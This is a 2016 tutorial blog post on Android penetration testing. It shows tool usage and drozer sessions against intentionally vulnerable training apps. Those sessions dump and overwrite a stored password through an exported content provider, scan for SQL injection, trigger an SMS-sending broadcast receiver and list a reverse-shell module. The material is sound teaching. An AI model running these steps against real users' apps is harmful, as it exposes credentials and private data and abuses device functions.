---
title: Learn Android Security
date: 2016-03-28 17:37:00
tags: Android
---


### Tools
#### 1) adb Usage

```
> adb install diva-beta.apk

2797 KB/s (1502294 bytes in 0.524s)
	pkg: /data/local/tmp/diva-beta.apk
Success
> adb forward tcp:31415 tcp:31415
```
#### 2) dex2jar Usage
```
> dex2jar diva-beta.apk
this cmd is deprecated, use the d2j-dex2jar if possible
dex2jar version: translator-0.0.9.15
dex2jar diva-beta.apk -> diva-beta_dex2jar.jar
Done.
```
#### 3) jd-gui Usage
```
> java -jar jd

```
#### 4) apktool Usage
```
> java -jar apktool.jar d diva-beta.apk -o output

I: Using Apktool 2.1.0 on diva-beta.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /root/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```
#### 5) drozer Usage
```
> adb forward tcp:31415 tcp:31415 
> drozer console connect
Selecting 21d2854429974111 (Xiaomi MI 3C 6.0.1)

            ..                    ..:.
           ..o..                  .r..
            ..a..  . ....... .  ..nd
              ro..idsnemesisand..pr
              .otectorandroidsneme.
           .,sisandprotectorandroids+.
         ..nemesisandprotectorandroidsn:.
        .emesisandprotectorandroidsnemes..
      ..isandp,..,rotectorandro,..,idsnem.
      .isisandp..rotectorandroid..snemisis.
      ,andprotectorandroidsnemisisandprotec.
     .torandroidsnemesisandprotectorandroid.
     .snemisisandprotectorandroidsnemesisan:
     .dprotectorandroidsnemesisandprotector.

drozer Console (v2.3.3)
dz>list
dz> list
app.activity.forintent                  Find activities that can handle the given intent                          
app.activity.info                       Gets information about exported activities.                               
app.activity.start                      Start an Activity                                                         
app.broadcast.info                      Get information about broadcast receivers                                 
app.broadcast.send                      Send broadcast using an intent                                            
app.package.attacksurface               Get attack surface of package                                             
app.package.backup                      Lists packages that use the backup API (returns true on FLAG_ALLOW_BACKUP)
app.package.debuggable                  Find debuggable packages                                                  
app.package.info                        Get information about installed packages                                  
app.package.launchintent                Get launch intent of package                                              
app.package.list                        List Packages                                                             
app.package.manifest                    Get AndroidManifest.xml of package                                        
app.package.native                      Find Native libraries embedded in the application.                        
app.package.shareduid                   Look for packages with shared UIDs                                        
app.provider.columns                    List columns in content provider                                          
app.provider.delete                     Delete from a content provider                                            
app.provider.download                   Download a file from a content provider that supports files               
app.provider.finduri                    Find referenced content URIs in a package                                 
app.provider.info                       Get information about exported content providers                          
app.provider.insert                     Insert into a Content Provider                                            
app.provider.query                      Query a content provider                                                  
app.provider.read                       Read from a content provider that supports files                          
app.provider.update                     Update a record in a content provider                                     
app.service.info                        Get information about exported services                                   
app.service.send                        send a Message to a service, and display the reply                        
app.service.start                       Start Service                                                             
app.service.stop                        Stop Service                                                              
auxiliary.webcontentresolver            Start a web service interface to content providers.                       
exploit.pilfer.general.apnprovider      Reads APN content provider                                                
exploit.pilfer.general.settingsprovider
                                        Reads Settings content provider                                           
information.datetime                    Print Date/Time                                                           
information.deviceinfo                  Get verbose device information                                            
information.permissions                 Get a list of all permissions used by packages on the device              
scanner.misc.native                     Find native components included in packages                               
scanner.misc.readablefiles              Find world-readable files in the given folder                             
scanner.misc.secretcodes                Search for secret codes that can be used from the dialer                  
scanner.misc.sflagbinaries              Find suid/sgid binaries in the given folder (default is /system).         
scanner.misc.writablefiles              Find world-writable files in the given folder                             
scanner.provider.finduris               Search for content providers that can be queried from our context.        
scanner.provider.injection              Test content providers for SQL injection vulnerabilities.                 
scanner.provider.sqltables              Find tables accessible through SQL injection vulnerabilities.             
scanner.provider.traversal              Test content providers for basic directory traversal vulnerabilities.     
shell.exec                              Execute a single Linux command.                                           
shell.send                              Send an ASH shell to a remote listener.                                   
shell.start                             Enter into an interactive Linux shell.                                    
tools.file.download                     Download a File                                                           
tools.file.md5sum                       Get md5 Checksum of file                                                  
tools.file.size                         Get size of file                                                          
tools.file.upload                       Upload a File                                                             
tools.setup.busybox                     Install Busybox.                                                          
tools.setup.minimalsu                   Prepare 'minimal-su' binary installation on the device.
```
#### 6) pidcat
```
> pidcat com.oprah.bees.android
```
#### 7) 重新打包签名
```
> apktool d demo.apk -o output
> apktool b output -o demo_new.apk
> jarsigner -keystore debug.keystore -storepass android -keypass android demo_new.apk androiddebugkey    #android自带debug.keystore进行签名
```
#### 8) port
```
> adb shell netstat -a|grep -E 'tcp|udp'|grep 'LISTEN'
```
#### 9) frida
```
> pip install frida
> wget http://build.frida.re/frida/android/arm/bin/frida-server
> adb push frida-server /data/local/tmp
> adb shell
> cd /data/local/tmp && chmod +x frida-server && ./frida-server -t 0
> adb forward tcp:27042 tcp:27042
> adb forward tcp:27043 tcp:27043
> frida-ps -R
```
```
PID NAME
 204 adbd
2375 android.process.acore
1419 android.process.media
 179 bridgemgrd
 906 com.android.launcher
 881 com.android.nfc
 839 com.android.phasebeam
 872 com.android.phone
 722 com.android.systemui
1674 com.android.vending
```
#### 10) android debug
> Android Studio > Tools > Android > SDK Manager > SDK Tools > Android NDK

```
> adb push gdbserver /system/bin/
> gdbserver tcp:9090 --attach [pid]     //android
> adb forward tcp:9090 tcp:9090
> gdb
(gdb) target remote :9090
```
#### 11) [Inspeckage](https://github.com/ac-pm/Inspeckage)
> open http://ip:8008

### OWASP Mobile Top 10


#### Insecure Data Storage
```
root@cancro:/data/data/com.jianguo.funcontrol/shared_prefs # ls -al
ls -al
-rw-rw---- u0_a216  u0_a216       124 2015-12-19 13:51 AGREE_PROTOCOL.xml
-rw-rw---- u0_a216  u0_a216       799 2016-02-06 18:42 CoreServicePrefs.xml
-rw-rw---- u0_a216  u0_a216       127 2016-01-31 17:09 WebViewChromiumPrefs.xml
-rw-rw---- u0_a216  u0_a216       226 2016-02-06 17:09 com.iflytek.msc.xml
-rw-rw---- u0_a216  u0_a216       133 2016-01-31 17:09 com.jianguo.funcontrol_preferences.xml
-rw-rw---- u0_a216  u0_a216     72801 2016-02-06 17:09 moive.sp.xml
-rw-rw---- u0_a216  u0_a216       942 2016-02-06 18:42 umeng_general_config.xml

root@cancro:/data/data/com.mwr.example.sieve # ls -al
ls -al
drwxrwx--x u0_a188  u0_a188           2015-08-03 20:51 cache
drwxrwx--x u0_a188  u0_a188           2016-06-30 00:02 code_cache
drwxrwx--x u0_a188  u0_a188           2014-08-01 22:32 databases
lrwxrwxrwx root     root              2016-06-29 22:36 lib -> /data/app-lib/com.mwr.example.sieve-1
```
#### Attacking Content Providers
```
dz> run app.package.attacksurface com.mwr.example.sieve
Attack Surface:
  3 activities exported
  0 broadcast receivers exported
  2 content providers exported
  2 services exported
    is debuggable

dz> run app.provider.finduri com.mwr.example.sieve
Scanning com.mwr.example.sieve...
content://com.mwr.example.sieve.DBContentProvider/
content://com.mwr.example.sieve.FileBackupProvider/
content://com.mwr.example.sieve.DBContentProvider
content://com.mwr.example.sieve.DBContentProvider/Passwords/
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.FileBackupProvider
content://com.mwr.example.sieve.DBContentProvider/Passwords
content://com.mwr.example.sieve.DBContentProvider/Keys

dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
| Password           | pin  |
| 123456789123456789 | 1234 |

dz> run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Keys/ --selection "pin=1234" --string Password "123456"
Done.

dz> run scanner.provider.injection -a com.mwr.example.sieve
Scanning com.mwr.example.sieve...
Not Vulnerable:
  content://com.mwr.example.sieve.DBContentProvider/Keys
  content://com.mwr.example.sieve.DBContentProvider/
  content://com.mwr.example.sieve.FileBackupProvider/
  content://com.mwr.example.sieve.DBContentProvider
  content://com.mwr.example.sieve.FileBackupProvider

Injection in Projection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/

Injection in Selection:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
```

#### Binary Protections
```
> dex2jar diva-beta.apk
this cmd is deprecated, use the d2j-dex2jar if possible
dex2jar version: translator-0.0.9.15
dex2jar diva-beta.apk -> diva-beta_dex2jar.jar
Done.
> jdgui
```
or
```
> jadx
```
#### Insufficient Transport Layer Protection
危害：缺乏证书校验、弱握手协商容易受到MITM攻击、隐私信息泄漏
```
通过burpsuite抓包工具可以查看到是否加密传输数据
```
#### Unintended Data Leakage
监控到数据泄漏密码  # String enetered: 123456
```
root@ubuntu:~# pidcat.py com.mwr.example.sieve

 art  I  Late-enabling -Xcheck:jni
         BoostFramework  V  mAcquireFunc method = public int com.qualcomm.qti.Performance.perfLockAcquire(int,int
                            [])
                         V  mReleaseFunc method = public int com.qualcomm.qti.Performance.perfLockRelease()
                         V  mAcquireTouchFunc method = public int com.qualcomm.qti.Performance.perfLockAcquireTou
                            ch(android.view.MotionEvent,android.util.DisplayMetrics,int,int[])
                         V  mIOPStart method = public int com.qualcomm.qti.Performance.perfIOPrefetchStart(int,ja
                            va.lang.String)
                         V  mIOPStop method = public int com.qualcomm.qti.Performance.perfIOPrefetchStop()
                         V  BoostFramework() : mPerf = com.qualcomm.qti.Performance@817a13
                         V  BoostFramework() : mPerf = com.qualcomm.qti.Performance@804f450
         OpenGLRenderer  D  Use EGL_SWAP_BEHAVIOR_PRESERVED: true
             Adreno-EGL  I  <qeglDrvAPI_eglInitialize:379>: EGL 1.4 QUALCOMM build: Nondeterministic_AU_msm8974_L
                            A.BF.1.1.3_RB1__release_AU (Ia10634f51b)
                         I  OpenGL ES Shader Compiler Version: E031.29.00.00
                         I  Build Date: 01/10/16 Sun
                         I  Local Branch: mybranch17687478
                         I  Remote Branch: quic/LA.BF.1.1.3_rb1.8
                         I  Local Patches: NONE
                         I  Reconstruct Branch: NOTHING
         OpenGLRenderer  I  Initialized EGL, version 1.4
         ActivityThread  D  Loading provider com.mwr.example.sieve.DBContentProvider: com.mwr.example.sieve.DBCon
                            tentProvider
            m_MainLogin  D  String enetered: 123456
               Timeline  I  Timeline: Activity_launch_request time:7110102
         BoostFramework  V  BoostFramework() : mPerf = com.qualcomm.qti.Performance@c941a0f
```
Copy/Paste Buffer Caching
```
复制粘贴异常导致程序崩溃
```

#### Broken Cryptography
加密算法秘钥显示在源代码中
```
> dex2jar diva-beta.apk
this cmd is deprecated, use the d2j-dex2jar if possible
dex2jar version: translator-0.0.9.15
dex2jar diva-beta.apk -> diva-beta_dex2jar.jar
Done.
> jd-gui diva-beta_dex2jar.jar
```

#### Attacking Services
如开启定位服务
```
dz> run app.service.info --package org.owasp.goatdroid.fourgoats
Package: org.owasp.goatdroid.fourgoats
  org.owasp.goatdroid.fourgoats.services.LocationService
    Permission: null

dz> run app.service.start --action org.owasp.goatdroid.fourgoats.services.LocationService --component org.owasp.goatdroid.fourgoats org.owasp.goatdroid.fourgoats.services.LocationService
```

#### Attacking Activities
列出在AndroidManifest.xml文件中的组件
```
dz> run app.activity.info -a org.owasp.goatdroid.fourgoats -u
Package: org.owasp.goatdroid.fourgoats
  Exported Activities:
    org.owasp.goatdroid.fourgoats.activities.Main
    org.owasp.goatdroid.fourgoats.activities.ViewCheckin
    org.owasp.goatdroid.fourgoats.activities.ViewProfile
    org.owasp.goatdroid.fourgoats.activities.SocialAPIAuthentication
  Hidden Activities:
    org.owasp.goatdroid.fourgoats.activities.Login
    org.owasp.goatdroid.fourgoats.activities.Register
    org.owasp.goatdroid.fourgoats.activities.Home
    org.owasp.goatdroid.fourgoats.fragments.DoCheckin
    org.owasp.goatdroid.fourgoats.activities.Checkins
    org.owasp.goatdroid.fourgoats.activities.Friends
    org.owasp.goatdroid.fourgoats.fragments.HistoryFragment
    org.owasp.goatdroid.fourgoats.activities.History
    org.owasp.goatdroid.fourgoats.activities.Rewards
    org.owasp.goatdroid.fourgoats.activities.AddVenue
    org.owasp.goatdroid.fourgoats.fragments.MyFriends
    org.owasp.goatdroid.fourgoats.fragments.SearchForFriends
    org.owasp.goatdroid.fourgoats.fragments.PendingFriendRequests
    org.owasp.goatdroid.fourgoats.activities.ViewFriendRequest
    org.owasp.goatdroid.fourgoats.fragments.MyRewards
    org.owasp.goatdroid.fourgoats.fragments.AvailableRewards
    org.owasp.goatdroid.fourgoats.activities.Preferences
    org.owasp.goatdroid.fourgoats.activities.About
    org.owasp.goatdroid.fourgoats.activities.SendSMS
    org.owasp.goatdroid.fourgoats.activities.DoComment
    org.owasp.goatdroid.fourgoats.activities.UserHistory
    org.owasp.goatdroid.fourgoats.activities.DestinationInfo
    org.owasp.goatdroid.fourgoats.activities.AdminHome
    org.owasp.goatdroid.fourgoats.activities.AdminOptions
    org.owasp.goatdroid.fourgoats.fragments.ResetUserPasswords
    org.owasp.goatdroid.fourgoats.fragments.DeleteUsers
    org.owasp.goatdroid.fourgoats.activities.DoAdminPasswordReset
    org.owasp.goatdroid.fourgoats.activities.DoAdminDeleteUser
    org.owasp.goatdroid.fourgoats.activities.GenericWebViewActivity
```
激活组件 拒绝服务漏洞
```
dz> run app.activity.start --component org.owasp.goatdroid.herdfinancial org.owasp.goatdroid.herdfinancial.activities.Main
```
#### Attacking Broadcast Receivers
发送短信
```
dz> run app.broadcast.info --package org.owasp.goatdroid.fourgoats
```
> 
org.owasp.goatdroid.fourgoats.SOCIAL_SMS在AndroidManifest.xml是这个名字
org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver在源代码中是这个名字
phoneNumber--手机号
message--短信内容

```
dz> run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers.SendSMSNowReceiver --extra string phoneNumber 1234 --extra string message "it's test"

```

#### Exploiting Debuggable Applications
开启debug调试模式
```
查看AndroidManifest.xml内容中android:debuggable="true"
使用如下命令比较两次结果可以查看到多了一个pid 5819
> adb jdwp
1214
2740
2910
2948
2966
3009
3038
3046
3155
3160
3167
3205
> adb jdwp
1214
2740
2910
2948
2966
3009
3038
3046
3155
3160
3167
3205
5819
> adb shell ps|grep '5819'
> adb shell ps|grep goat
u0_a236   5819  291   809528 66344 sys_epoll_ 00000000 S org.owasp.goatdroid.fourgoats


shell@cancro:/ $ run-as com.mwr.example.sieve
shell@cancro:/data/data/com.mwr.example.sieve $ ls -al                         
drwxrwx--x u0_a188  u0_a188           2015-08-03 20:51 cache
drwxrwx--x u0_a188  u0_a188           2016-06-30 00:02 code_cache
drwxrwx--x u0_a188  u0_a188           2014-08-01 22:32 databases
lrwxrwxrwx root     root              2016-06-29 22:36 lib -> /data/app-lib/com.mwr.example.sieve-1
此时不需要root权限即可访问当前目录
```
### WebView
[WebView高危接口安全检测](https://jaq.alibaba.com/blog.htm?id=48)

[WebView明文存储密码漏洞](http://www.wooyun.org/bugs/wooyun-2013-020246)

[Webview file跨域访问](http://blog.csdn.net/jltxgcy/article/details/50678304)
[online](http://drops.wooyun.org/webview.html)
